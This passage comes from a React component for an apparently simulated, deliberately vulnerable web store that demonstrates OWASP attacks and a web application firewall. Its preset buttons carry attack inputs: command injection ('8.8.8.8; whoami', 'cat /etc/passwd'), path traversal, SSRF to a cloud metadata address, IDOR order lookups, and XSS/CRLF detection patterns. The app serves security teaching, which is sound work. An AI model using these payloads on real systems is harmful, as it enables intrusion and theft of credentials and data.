                              <span className="font-mono font-bold text-xs text-cyan-700">
                                ${(item.product.price * item.quantity).toFixed(2)}
                              </span>
                            </div>
                          ))}
                          <div className="pt-2 flex justify-between items-center text-xs">
                            <span className="font-bold text-slate-900">Subtotal:</span>
                            <span className="font-mono font-black text-sm text-cyan-700">${cartTotal.toFixed(2)}</span>
                          </div>
                        </div>

                        {/* IDOR Order Lookup */}
                        <div className="md:col-span-6 rounded-2xl border border-red-200 bg-red-50/70 p-5 space-y-3 shadow-sm">
                          <div className="flex items-center gap-2">
                            <span className="text-lg">🔓</span>
                            <div>
                              <h3 className="text-xs font-bold text-red-900 uppercase tracking-wider">
                                Track Order by ID (IDOR Vulnerability)
                              </h3>
                              <p className="text-[10px] text-slate-600">
                                Change Order ID to view other users' confidential receipts.
                              </p>
                            </div>
                          </div>

                          <div className="flex gap-2">
                            <Input
                              value={orderLookupId}
                              onChange={(e) => setOrderLookupId(e.target.value)}
                              placeholder="Order ID"
                              className="h-9 font-mono text-xs bg-white border-slate-300 text-slate-900"
                            />
                            <Button
                              size="sm"
                              onClick={() => handleOrderLookup(orderLookupId)}
                              className="h-9 px-4 text-xs font-bold bg-red-600 text-white hover:bg-red-700 shadow-sm"
                            >
                              Fetch Order
                            </Button>
                          </div>

                          <div className="flex flex-wrap gap-1.5">
                            {["1001 (My Order)", "1002 (CFO VIP)", "1003 (Director)", "1004 (DBA)"].map((opt) => {
                              const idOnly = opt.split(" ")[0];
                              return (
                                <button
                                  key={opt}
                                  type="button"
                                  onClick={() => {
                                    setOrderLookupId(idOnly);
                                    handleOrderLookup(idOnly);
                                  }}
                                  className="rounded border border-red-300 bg-white px-2 py-0.5 text-[9px] font-mono text-red-700 hover:bg-red-100 shadow-sm"
                                >
                                  ID: {opt}
                                </button>
                              );
                            })}
                          </div>

                          {/* Looked Up Order Result */}
                          {lookedUpOrder && (
                            <div
                              className={cn(
                                "rounded-xl border p-3 text-xs space-y-1.5 font-mono shadow-sm",
                                lookedUpOrder.isConfidential
                                  ? "border-red-300 bg-white text-red-950"
                                  : "border-slate-200 bg-white text-slate-800"
                              )}
                            >
                              <div className="flex justify-between items-center border-b border-slate-200 pb-1">
                                <span className="font-bold">INVOICE #{lookedUpOrder.id}</span>
                                <span className="rounded bg-emerald-100 text-emerald-800 border border-emerald-200 px-1.5 py-0.2 text-[9px] font-bold">
                                  {lookedUpOrder.status}
                                </span>
                              </div>
                              <p><span className="text-slate-500 font-medium">Customer:</span> {lookedUpOrder.customerName}</p>
                              <p><span className="text-slate-500 font-medium">Email:</span> {lookedUpOrder.email}</p>
                              <p><span className="text-slate-500 font-medium">Card on File:</span> ****-****-****-{lookedUpOrder.cardLast4}</p>
                              <p className="font-bold text-cyan-800"><span className="text-slate-500 font-medium">Total:</span> ${lookedUpOrder.total.toFixed(2)}</p>
                              {lookedUpOrder.isConfidential && (
                                <p className="text-[9px] font-bold text-red-700 bg-red-100 p-1.5 rounded border border-red-200">
                                  ⚠️ IDOR EXPLOITED: Accessed unauthorized executive billing records!
                                </p>
                              )}
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 6: USER DASHBOARD
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "dashboard" && currentUser && (
                    <div className="space-y-6">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-3">
                          <span className="text-4xl p-2.5 rounded-2xl bg-cyan-100 border border-cyan-200">
                            {currentUser.avatar}
                          </span>
                          <div>
                            <h2 className="text-lg font-bold text-slate-900">{currentUser.name}</h2>
                            <p className="text-xs text-slate-500 font-medium">
                              {currentUser.role} · {currentUser.department}
                            </p>
                          </div>
                        </div>

                        {currentUser.role.includes("Admin") && (
                          <Button
                            size="sm"
                            onClick={() => navigateTo("admin")}
                            className="h-8 text-xs font-bold rounded-xl bg-amber-600 text-white hover:bg-amber-700 shadow-sm"
                          >
                            <Unlock className="size-3.5 mr-1" /> Open Admin Vault
                          </Button>
                        )}
                      </div>

                      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                        {[
                          { label: "Assigned Tokens", value: "3 FIDO2 Keys", icon: <Key className="size-4 text-cyan-600" /> },
                          { label: "Security Posture", value: "99 / 100", icon: <ShieldCheck className="size-4 text-emerald-600" /> },
                          { label: "API Requests", value: "18,492 reqs", icon: <TrendingUp className="size-4 text-indigo-600" /> },
                          { label: "Attack Intercepts", value: "349 blocked", icon: <Shield className="size-4 text-amber-600" /> },
                        ].map((s, idx) => (
                          <div key={idx} className="rounded-2xl border border-slate-200 bg-white p-3.5 space-y-1 shadow-sm">
                            <div className="flex items-center justify-between">
                              <span className="text-[10px] text-slate-500 font-semibold">{s.label}</span>
                              {s.icon}
                            </div>
                            <p className="font-mono font-bold text-base text-slate-900">{s.value}</p>
                          </div>
                        ))}
                      </div>

                      <div className="rounded-2xl border border-slate-200 bg-white p-5 space-y-3 shadow-sm">
                        <h3 className="text-xs font-bold uppercase tracking-wider text-slate-500">
                          Active API Keys & Environment Tokens
                        </h3>
                        <div className="rounded-xl bg-slate-50 border border-slate-200 p-3 font-mono text-xs flex justify-between items-center">
                          <div>
                            <p className="text-[10px] text-slate-500">Assigned Master Token:</p>
                            <p className="text-cyan-800 font-bold">{currentUser.apiKeys}</p>
                          </div>
                          <Button
                            size="sm"
                            variant="ghost"
                            onClick={() => toast.success("Token copied")}
                            className="h-7 text-xs text-slate-600 hover:text-slate-900"
                          >
                            <Copy className="size-3" />
                          </Button>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 7: SYSTEM DIAGNOSTICS (CMDI / LFI / SSRF)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "diagnostics" && (
                    <div className="space-y-6">
                      <div>
                        <h2 className="text-lg font-bold text-slate-900 flex items-center gap-2">
                          <Wrench className="size-5 text-emerald-600" /> System Diagnostics Console (RCE / LFI / SSRF)
                        </h2>
                        <p className="text-xs text-slate-500 mt-0.5">
                          Internal developer utilities used to diagnose network connectivity, file storage, and webhook
                          integrations.
                        </p>
                      </div>

                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                        {/* 1. Network Ping Tool (CMDi) */}
                        <div className="rounded-2xl border border-slate-200 bg-white p-4 flex flex-col justify-between space-y-3 shadow-sm">
                          <div>
                            <div className="flex items-center gap-2 mb-1">
                              <Terminal className="size-4 text-emerald-600" />
                              <h3 className="text-xs font-bold text-slate-900 uppercase">1. Ping Tool (CMDi)</h3>
                            </div>
                            <Input
                              value={pingHost}
                              onChange={(e) => setPingHost(e.target.value)}
                              className="h-8 font-mono text-xs bg-slate-50 border-slate-300 text-slate-900"
                            />
                            <div className="mt-2 flex flex-wrap gap-1">
                              {["8.8.8.8; whoami", "127.0.0.1 && cat /etc/passwd"].map((p) => (
                                <button
                                  key={p}
                                  type="button"
                                  onClick={() => handlePingExecute(p)}
                                  className="rounded border border-red-200 bg-red-50 px-1.5 py-0.5 text-[9px] font-mono text-red-700 hover:bg-red-100"
                                >
                                  {p}
                                </button>
                              ))}
                            </div>
                          </div>
                          <Button
                            size="sm"
                            onClick={() => handlePingExecute(pingHost)}
                            className="w-full h-8 text-xs font-bold bg-emerald-600 text-white hover:bg-emerald-700 shadow-sm"
                          >
                            Execute Ping
                          </Button>
                        </div>

                        {/* 2. File Downloader (Path Traversal) */}
                        <div className="rounded-2xl border border-slate-200 bg-white p-4 flex flex-col justify-between space-y-3 shadow-sm">
                          <div>
                            <div className="flex items-center gap-2 mb-1">
                              <FileCode className="size-4 text-cyan-600" />
                              <h3 className="text-xs font-bold text-slate-900 uppercase">2. Report Viewer (LFI)</h3>
                            </div>
                            <Input
                              value={traversalPath}
                              onChange={(e) => setTraversalPath(e.target.value)}
                              className="h-8 font-mono text-xs bg-slate-50 border-slate-300 text-slate-900"
                            />
                            <div className="mt-2 flex flex-wrap gap-1">
                              {["../../../../etc/passwd", "..\\..\\windows\\win.ini"].map((p) => (
                                <button
                                  key={p}
                                  type="button"
                                  onClick={() => handleTraversalExecute(p)}
                                  className="rounded border border-red-200 bg-red-50 px-1.5 py-0.5 text-[9px] font-mono text-red-700 hover:bg-red-100"
                                >
                                  {p}
                                </button>
                              ))}
                            </div>
                          </div>
                          <Button
                            size="sm"
                            onClick={() => handleTraversalExecute(traversalPath)}
                            className="w-full h-8 text-xs font-bold bg-cyan-600 text-white hover:bg-cyan-700 shadow-sm"
                          >
                            Fetch Report File
                          </Button>
                        </div>

                        {/* 3. Webhook Tester (SSRF) */}
                        <div className="rounded-2xl border border-slate-200 bg-white p-4 flex flex-col justify-between space-y-3 shadow-sm">
                          <div>
                            <div className="flex items-center gap-2 mb-1">
                              <Globe2 className="size-4 text-indigo-600" />
                              <h3 className="text-xs font-bold text-slate-900 uppercase">3. Webhook (SSRF)</h3>
                            </div>
                            <Input
                              value={webhookUrl}
                              onChange={(e) => setWebhookUrl(e.target.value)}
                              className="h-8 font-mono text-xs bg-slate-50 border-slate-300 text-slate-900"
                            />
                            <div className="mt-2 flex flex-wrap gap-1">
                              {["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:8080/admin"].map((p) => (
                                <button
                                  key={p}
                                  type="button"
                                  onClick={() => handleWebhookExecute(p)}
                                  className="rounded border border-red-200 bg-red-50 px-1.5 py-0.5 text-[9px] font-mono text-red-700 hover:bg-red-100"
                                >
                                  {p.slice(0, 20)}...
                                </button>
                              ))}
                            </div>
                          </div>
                          <Button
                            size="sm"
                            onClick={() => handleWebhookExecute(webhookUrl)}
                            className="w-full h-8 text-xs font-bold bg-indigo-600 text-white hover:bg-indigo-700 shadow-sm"
                          >
                            Verify Webhook
                          </Button>
                        </div>
                      </div>

                      {/* Server Output Console */}
                      {(pingOutput || traversalOutput || webhookOutput) && (
                        <div className="rounded-2xl border border-slate-300 bg-slate-900 p-4 font-mono text-xs space-y-2 text-white shadow-md">
                          <div className="flex justify-between items-center border-b border-slate-700 pb-1.5">
                            <span className="text-cyan-400 font-bold flex items-center gap-1.5">
                              <Terminal className="size-3.5" /> Backend Server Output
                            </span>
                            <button
                              type="button"
                              onClick={() => {
                                setPingOutput(null);
                                setTraversalOutput(null);
                                setWebhookOutput(null);
                              }}
                              className="text-slate-400 hover:text-white text-[10px]"
                            >
                              Clear
                            </button>
                          </div>
                          {pingOutput && <pre className="text-emerald-400 whitespace-pre-wrap">{pingOutput}</pre>}
                          {traversalOutput && <pre className="text-cyan-300 whitespace-pre-wrap">{traversalOutput}</pre>}
                          {webhookOutput && <pre className="text-amber-300 whitespace-pre-wrap">{webhookOutput}</pre>}
                        </div>
                      )}
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 8: ADMIN CONSOLE & SECRETS VAULT
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "admin" && (
                    <div className="space-y-6">
                      <div className="rounded-2xl border border-amber-300 bg-amber-50 p-5 shadow-sm">
                        <div className="flex items-center gap-3">
                          <span className="text-3xl">👑</span>
                          <div>
                            <h2 className="text-base font-extrabold text-amber-900">
                              Executive Admin Vault & User Directory
                            </h2>
                            <p className="text-xs text-amber-800">
                              Confidential database user credentials and master encryption keys.
                            </p>
                          </div>
                        </div>
                      </div>

                      <div className="rounded-2xl border border-slate-200 bg-white p-5 space-y-3 shadow-sm">
                        <h3 className="text-xs font-bold uppercase tracking-wider text-slate-500">
                          Internal User Database (Password Hashes & Tokens)
                        </h3>
                        <div className="overflow-x-auto">
                          <table className="w-full text-left text-xs">
                            <thead>
                              <tr className="border-b border-slate-200 text-slate-500 text-[10px] uppercase font-bold">
                                <th className="py-2">User</th>
                                <th className="py-2">Email</th>
                                <th className="py-2">Role</th>
                                <th className="py-2">API Secret</th>
                              </tr>
                            </thead>
                            <tbody className="divide-y divide-slate-100 font-mono text-[11px]">
                              {FAKE_USERS.map((u, i) => (
                                <tr key={i} className="hover:bg-slate-50">
                                  <td className="py-2 font-bold text-slate-900">
                                    {u.avatar} {u.username}
                                  </td>
                                  <td className="py-2 text-slate-500">{u.email}</td>
                                  <td className="py-2 text-cyan-800 font-semibold">{u.role}</td>
                                  <td className="py-2 text-amber-800 font-semibold">{u.apiKeys}</td>
                                </tr>
                              ))}
                            </tbody>
                          </table>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 9: SUPPORT DESK (STORED XSS / CRLF)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "contact" && (
                    <div className="max-w-xl mx-auto space-y-6 py-2">
                      <div className="text-center space-y-1">
                        <h2 className="text-lg font-bold text-slate-900">Submit Support Ticket</h2>
                        <p className="text-xs text-slate-500">Contact our 24/7 Security Operations Center</p>
                      </div>

                      <form
                        onSubmit={(e) => {
                          e.preventDefault();
                          const isXss = /<script|onerror|onload|<img/i.test(contactName + contactMessage);
                          const isCrlf = /%0a|%0d|bcc:|subject:/i.test(contactEmail);
                          executeRequest(
                            `name=${encodeURIComponent(contactName)}&email=${encodeURIComponent(
                              contactEmail
                            )}&subject=${encodeURIComponent(contactSubject)}&message=${encodeURIComponent(
                              contactMessage
                            )}`,
                            "message",
                            "POST",
                            "/api/support/tickets",
                            isXss ? "stored-xss" : isCrlf ? "email-injection" : undefined
                          );
                        }}
                        className="rounded-2xl border border-slate-200 bg-white p-5 space-y-3.5 shadow-md"
                      >
                        <div className="grid grid-cols-2 gap-3">
                          <div>
                            <label className="block text-[11px] font-bold text-slate-700 mb-1">Your Name</label>
                            <Input
                              value={contactName}
                              onChange={(e) => setContactName(e.target.value)}
                              className="h-9 text-xs font-mono bg-slate-50 border-slate-300 text-slate-900"
                            />
                          </div>
                          <div>
                            <label className="block text-[11px] font-bold text-slate-700 mb-1">
                              Email (CRLF Injection Vector)
                            </label>
                            <Input
                              value={contactEmail}
                              onChange={(e) => setContactEmail(e.target.value)}
                              className="h-9 text-xs font-mono bg-slate-50 border-slate-300 text-slate-900"
                            />
                          </div>
                        </div>

                        <div>
                          <label className="block text-[11px] font-bold text-slate-700 mb-1">Subject</label>
                          <Input
                            value={contactSubject}
                            onChange={(e) => setContactSubject(e.target.value)}
                            className="h-9 text-xs bg-slate-50 border-slate-300 text-slate-900"
                          />
                        </div>

                        <div>
                          <label className="block text-[11px] font-bold text-slate-700 mb-1">
                            Message (Stored XSS Vector)
                          </label>
                          <Textarea
                            value={contactMessage}
                            onChange={(e) => setContactMessage(e.target.value)}
                            className="min-h-24 text-xs font-mono bg-slate-50 border-slate-300 text-slate-900 resize-none"
                          />
                        </div>

                        <Button type="submit" className="w-full h-9 rounded-xl font-bold text-xs bg-cyan-600 text-white hover:bg-cyan-700 shadow-sm">
                          Submit Ticket →
                        </Button>
                      </form>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 10: KNOWLEDGE BASE & DOCS
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "docs" && (
                    <div className="space-y-6">
                      <div className="text-center space-y-1.5 max-w-md mx-auto">
                        <h2 className="text-lg font-bold text-slate-900">Knowledge Base & Security Docs</h2>
                        <p className="text-xs text-slate-500">Search technical integration guides</p>
                      </div>

                      <div className="space-y-3">
                        {DOC_ARTICLES.map((doc) => (
                          <div key={doc.id} className="rounded-2xl border border-slate-200 bg-white p-4 space-y-1 shadow-sm">
                            <div className="flex justify-between items-center">
                              <h3 className="text-xs font-bold text-cyan-800">{doc.title}</h3>
                              <span className="rounded bg-slate-100 px-2 py-0.5 text-[9px] font-semibold text-slate-600">
                                {doc.category}
                              </span>
                            </div>
                            <p className="text-xs text-slate-600">{doc.snippet}</p>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </>
              )}
            </div>

            {/* In-Browser Footer */}
            <div className="border-t border-slate-200 bg-slate-100/90 px-5 py-2.5 flex items-center justify-between text-[10px] text-slate-500">
              <span>© 2026 Apex CyberStore Systems · Protected by WebGuard AI WAF</span>
              <span className="flex items-center gap-1 font-mono">
                Reverse Proxy Target: <span className="text-cyan-700 font-bold">http://127.0.0.1:8080</span>
              </span>
            </div>
          </div>
        </div>

        {/* ═══════════════════════════════════════════════════════════════════
            RIGHT: Live Traffic, Raw Terminal & Threat Analysis Panel
        ════════════════════════════════════════════════════════════════════ */}
        <div className="xl:col-span-5 flex flex-col gap-3">
          {/* Tab Selector */}
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-1.5">
              {[
                { id: "visual" as const, label: "Live Traffic", icon: <Globe2 className="size-3.5" /> },
                { id: "http" as const, label: "HTTP Terminal", icon: <Terminal className="size-3.5" /> },
                { id: "analysis" as const, label: "OWASP Triage", icon: <Bug className="size-3.5" /> },
              ].map((t) => (
                <button
                  key={t.id}
                  type="button"
                  onClick={() => setResponseTab(t.id)}
                  className={cn(
                    "flex items-center gap-1.5 rounded-xl border px-3 py-1.5 text-xs font-bold transition-all shadow-sm",
                    responseTab === t.id
                      ? "border-cyan-600 bg-cyan-600 text-white"
                      : "border-slate-200 bg-white text-slate-600 hover:text-slate-900 hover:bg-slate-50"
                  )}
                >
                  {t.icon} {t.label}
                </button>
              ))}
            </div>

            <Button
              variant="ghost"
              size="sm"
              className="h-7 text-[10px] text-slate-500 hover:text-slate-900"
              onClick={() => {
                setLogs([]);
                setLastResult(null);
                setActiveExploitDisplay(null);
              }}
            >
              <RefreshCw className="size-3 mr-1" /> Clear Stream
            </Button>
          </div>

          {/* Tab 1: Live Traffic Log */}
          {responseTab === "visual" && (
            <div className="flex min-h-[500px] max-h-[680px] flex-col overflow-hidden p-0 rounded-2xl border border-slate-200 bg-white text-slate-900 shadow-md">
              <div className="flex items-center justify-between border-b border-slate-200 bg-slate-50 px-4 py-2.5">
                <span className="text-xs font-bold text-slate-900 flex items-center gap-1.5">
                  <Globe2 className="size-4 text-cyan-600" /> Intercepted HTTP Exchanges ({logs.length / 2})
                </span>
                <span className="text-[10px] text-slate-500 font-mono">Edge Pipeline</span>
              </div>

              <div className="flex-1 overflow-y-auto p-3.5 space-y-3">
                {logs.length === 0 ? (
                  <div className="flex flex-col items-center justify-center py-28 text-center gap-2">
                    <Globe2 className="size-10 text-slate-300" />
                    <p className="text-xs font-semibold text-slate-700">Waiting for website traffic...</p>
                    <p className="text-[10px] text-slate-500 max-w-xs">
                      Interact with the store on the left (search, review, ping, IDOR order lookup) to see real-time
                      packet inspection.
                    </p>
                  </div>
                ) : (
                  logs.map((log) => (
                    <div
                      key={log.id}
                      className={cn(
                        "rounded-xl border p-3 text-xs space-y-2 transition-all shadow-sm",
                        log.type === "request"
                          ? "border-cyan-200 bg-cyan-50/50"
                          : log.type === "waf"
                          ? "border-emerald-200 bg-emerald-50/70"
                          : "border-red-200 bg-red-50/50"
                      )}
                    >
                      <div className="flex items-center gap-2">
                        <span
                          className={cn(
                            "rounded px-1.5 py-0.5 text-[8px] font-black uppercase tracking-wider text-white",
                            log.type === "request"
                              ? "bg-cyan-600"
                              : log.type === "waf"
                              ? "bg-emerald-600"
                              : "bg-red-600"
                          )}
                        >
                          {log.type === "request" ? "→ INGRESS" : log.type === "waf" ? "🛡️ WAF 403" : "← EGRESS"}
                        </span>
                        {log.method && (
                          <span className="font-mono text-[10px] font-bold text-slate-900">{log.method}</span>
                        )}
                        {log.path && <span className="font-mono text-[10px] text-slate-600 truncate">{log.path}</span>}
                        {log.threatScore !== undefined && (
                          <span
                            className={cn(
                              "ml-auto font-mono text-[9px] font-bold px-1.5 py-0.5 rounded border",
                              log.threatScore > 70
                                ? "bg-red-50 text-red-700 border-red-200"
                                : log.threatScore > 30
                                ? "bg-amber-50 text-amber-700 border-amber-200"
                                : "bg-emerald-50 text-emerald-700 border-emerald-200"
                            )}
                          >
                            Score: {log.threatScore}/100
                          </span>
                        )}
                      </div>

                      {log.body && (
                        <pre className="max-h-20 overflow-x-auto rounded bg-slate-900 p-2 font-mono text-[10px] text-slate-100 whitespace-pre-wrap">
                          {log.body}
                        </pre>
                      )}

                      {log.vulnId && VULN_DEFS[log.vulnId] && (
                        <div className="flex items-center justify-between border-t border-slate-200 pt-1.5 text-[10px]">
                          <span className="text-slate-600 font-semibold">
                            CWE: {VULN_DEFS[log.vulnId].cwe} · {VULN_DEFS[log.vulnId].label}
                          </span>
                          <span
                            className={cn(
                              "rounded-full px-2 py-0.2 text-[8px] font-bold",
                              SEVERITY_META[VULN_DEFS[log.vulnId].severity].badge
                            )}
                          >
                            {SEVERITY_META[VULN_DEFS[log.vulnId].severity].label}
                          </span>
                        </div>
                      )}
                    </div>
                  ))
                )}
                <div ref={logsEndRef} />
              </div>
            </div>
          )}

          {/* Tab 2: Raw HTTP Terminal Stream */}
          {responseTab === "http" && (
            <div className="flex min-h-[500px] max-h-[680px] flex-col overflow-hidden p-0 rounded-2xl border border-slate-300 bg-slate-900 text-slate-100 shadow-md">
              <div className="flex items-center justify-between border-b border-slate-800 bg-slate-950 px-4 py-2.5">
                <span className="text-xs font-mono font-bold text-cyan-400 flex items-center gap-1.5">
                  <Terminal className="size-3.5" /> Socket Stream Inspector
                </span>
                <span className="text-[10px] text-slate-400 font-mono">HTTP/1.1 Edge</span>
              </div>

              <div className="flex-1 overflow-y-auto p-4 font-mono text-[11px] leading-relaxed text-slate-300 space-y-4">
                {logs.length === 0 ? (
                  <span className="text-slate-500"># No packets logged yet.</span>
                ) : (
                  logs.map((log) => (
                    <div key={log.id} className="border-b border-slate-800 pb-3">
                      <p className="text-[9px] text-slate-500 mb-1">
                        ─── {new Date(log.ts).toLocaleTimeString()} ───
                      </p>
                      {log.type === "request" && (
                        <>
                          <p className="text-cyan-400 font-bold">
                            → {log.method} {log.path} HTTP/1.1
                          </p>
                          <p className="text-slate-400">Host: apex-cyberstore.io</p>
                          <p className="text-slate-400">User-Agent: Mozilla/5.0 (Windows NT 10.0)</p>
                          {log.body && <p className="text-emerald-400 mt-1 font-semibold">{log.body}</p>}
                        </>
                      )}
                      {log.type === "waf" && (
                        <>
                          <p className="text-emerald-400 font-bold">← HTTP/1.1 403 Forbidden (WAF Intercept)</p>
                          <p className="text-slate-400">X-WebGuard-Rule: {log.vulnId?.toUpperCase()}</p>
                          <p className="text-slate-400">X-WebGuard-Action: BLOCKED_AT_EDGE</p>
                          <p className="text-emerald-300 mt-1">{log.body?.slice(0, 160)}...</p>
                        </>
                      )}
                      {log.type === "response" && (
                        <>
                          <p className="text-red-400 font-bold">← HTTP/1.1 {log.status} OK (Backend Response)</p>
                          <p className="text-slate-400">Server: Uvicorn/FastAPI (Port 8080)</p>
                          <p className="text-slate-400">Content-Type: application/json</p>
                          <p className="text-red-300 mt-1">{log.body?.slice(0, 160)}...</p>
                        </>
                      )}
                    </div>
                  ))
                )}
              </div>
            </div>
          )}

          {/* Tab 3: OWASP Attack Triage */}
          {responseTab === "analysis" && (
            <div className="flex min-h-[500px] max-h-[680px] flex-col overflow-hidden p-4 rounded-2xl border border-slate-200 bg-white text-slate-900 shadow-md space-y-4">
              <h3 className="text-xs font-bold uppercase tracking-wider text-slate-500 flex items-center gap-1.5">
                <Bug className="size-4 text-red-600" /> OWASP Threat Classification & Virtual Patch
              </h3>

              {!lastResult || !lastResult.vulnId ? (
                <div className="flex flex-col items-center justify-center py-28 text-center gap-2">
                  <Bug className="size-10 text-slate-300" />
                  <p className="text-xs text-slate-600 font-medium">No recent exploit analyzed.</p>
                  <p className="text-[10px] text-slate-400">
                    Trigger an attack (SQLi, XSS, CMDi) from the store to inspect the vulnerability defense breakdown.
                  </p>
                </div>
              ) : (
                <div className="space-y-4 overflow-y-auto pr-1">
                  <div
                    className={cn(
                      "rounded-2xl border-2 p-4 flex items-center gap-3 shadow-sm",
                      lastResult.blocked
                        ? "border-emerald-300 bg-emerald-50 text-emerald-950"
                        : "border-red-300 bg-red-50 text-red-950"
                    )}
                  >
                    {lastResult.blocked ? (
                      <ShieldCheck className="size-8 text-emerald-600" />
                    ) : (
                      <ShieldAlert className="size-8 text-red-600" />
                    )}
                    <div>
                      <h4
                        className={cn(
                          "text-sm font-extrabold",
                          lastResult.blocked ? "text-emerald-900" : "text-red-900"
                        )}
                      >
                        {lastResult.blocked ? "🛡️ Attack Dropped by WebGuard Edge (403 Forbidden)" : "⚠️ Vulnerability Exploited!"}
                      </h4>
                      <p className="text-xs text-slate-600">
                        {VULN_DEFS[lastResult.vulnId]?.label || "Custom Attack"}
                      </p>
                    </div>
                  </div>

                  {VULN_DEFS[lastResult.vulnId] && (
                    <div className="rounded-2xl border border-slate-200 bg-slate-50 p-4 space-y-2.5 text-xs shadow-sm">
                      <div className="flex items-center justify-between">
                        <span className="font-bold text-slate-900">{VULN_DEFS[lastResult.vulnId].label}</span>
                        <span
                          className={cn(
                            "rounded-full px-2 py-0.5 text-[9px] font-bold",
                            SEVERITY_META[VULN_DEFS[lastResult.vulnId].severity].badge
                          )}
                        >
                          {SEVERITY_META[VULN_DEFS[lastResult.vulnId].severity].label}
                        </span>
                      </div>
                      <p className="text-slate-600 text-[11px] leading-relaxed">
                        {VULN_DEFS[lastResult.vulnId].description}
                      </p>
                      <div className="flex gap-4 text-[10px] text-slate-500 font-semibold">
                        <span>CWE: {VULN_DEFS[lastResult.vulnId].cwe}</span>
                        <span>OWASP: {VULN_DEFS[lastResult.vulnId].owasp}</span>
                      </div>

                      <div className="rounded-xl border border-emerald-300 bg-emerald-50 p-3 space-y-1">
                        <p className="text-[10px] font-bold text-emerald-800 uppercase tracking-wider">
                          🛡️ WebGuard Virtual Patch Policy:
                        </p>
                        <p className="text-[11px] text-emerald-900 font-mono font-semibold">
                          {VULN_DEFS[lastResult.vulnId].wafPatch}
                        </p>
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
